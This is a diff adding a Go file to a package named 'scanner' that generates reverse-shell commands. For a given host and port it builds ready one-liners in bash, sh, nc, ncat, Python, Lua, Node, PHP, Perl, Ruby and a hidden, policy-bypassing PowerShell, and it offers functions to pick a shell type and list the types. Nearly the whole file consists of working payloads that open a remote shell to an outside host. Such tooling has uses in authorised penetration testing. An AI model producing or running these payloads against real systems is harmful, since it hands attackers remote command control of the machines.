@@ -1,0 +1,70 @@
+package scanner
+
+import (
+	"fmt"
+	"strings"
+)
+
+// shellDef 反弹 shell 定义
+type shellDef struct {
+	name string
+	gen  func(h string, p int) string
+}
+
+var shells = []shellDef{
+	{"bash", func(h string, p int) string {
+		return fmt.Sprintf("bash -i >& /dev/tcp/%s/%d 0>&1", h, p)
+	}},
+	{"sh", func(h string, p int) string {
+		return fmt.Sprintf("sh -i >& /dev/tcp/%s/%d 0>&1", h, p)
+	}},
+	{"nc", func(h string, p int) string {
+		return fmt.Sprintf("nc -e /bin/sh %s %d", h, p)
+	}},
+	{"ncat", func(h string, p int) string {
+		return fmt.Sprintf("ncat %s %d -e /bin/sh", h, p)
+	}},
+	{"python", func(h string, p int) string {
+		return fmt.Sprintf("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%d));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", h, p)
+	}},
+	{"python2", func(h string, p int) string {
+		return fmt.Sprintf("python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%d));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", h, p)
+	}},
+	{"lua", func(h string, p int) string {
+		return fmt.Sprintf("lua -e 'require(\"socket\");local s=socket.tcp();s:connect(\"%s\",%d);while true do local r=s:receive();local f=assert(io.popen(r,\"r\"));s:send(f:read(\"*a\"));end'", h, p)
+	}},
+	{"node", func(h string, p int) string {
+		return fmt.Sprintf("node -e '(function(){var net=require(\"net\"),cp=require(\"child_process\"),sh=cp.spawn(\"/bin/sh\",[]);var c=new net.Socket();c.connect(%d,\"%s\",function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});return /a/;})()'", p, h)
+	}},
+	{"php", func(h string, p int) string {
+		return fmt.Sprintf("php -r '$sock=fsockopen(\"%s\",%d);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", h, p)
+	}},
+	{"perl", func(h string, p int) string {
+		return fmt.Sprintf("perl -e 'use Socket;$i=\"%s\";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'", h, p)
+	}},
+	{"ruby", func(h string, p int) string {
+		return fmt.Sprintf("ruby -rsocket -e'f=TCPSocket.open(\"%s\",%d).to_i;exec sprintf(\"/bin/sh -i <&%%d >&%%d 2>&%%d\",f,f,f)'", h, p)
+	}},
+	{"powershell", func(h string, p int) string {
+		return fmt.Sprintf("powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$c=New-Object System.Net.Sockets.TCPClient('%s',%d);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$x=$r+'PS '+(pwd).Path+'> ';$y=([text.encoding]::ASCII).GetBytes($x);$s.Write($y,0,$y.Length)};$c.Close()\"", h, p)
+	}},
+}
+
+// ReverseShell 生成反弹 shell 命令, 不支持的类型返回空字符串
+func ReverseShell(shell, lhost string, lport int) string {
+	for _, s := range shells {
+		if s.name == strings.ToLower(strings.TrimSpace(shell)) {
+			return s.gen(lhost, lport)
+		}
+	}
+	return ""
+}
+
+// ShellTypeList 返回支持的 shell 类型列表
+func ShellTypeList() []string {
+	out := make([]string, 0, len(shells))
+	for _, s := range shells {
+		out = append(out, s.name)
+	}
+	return out
+}
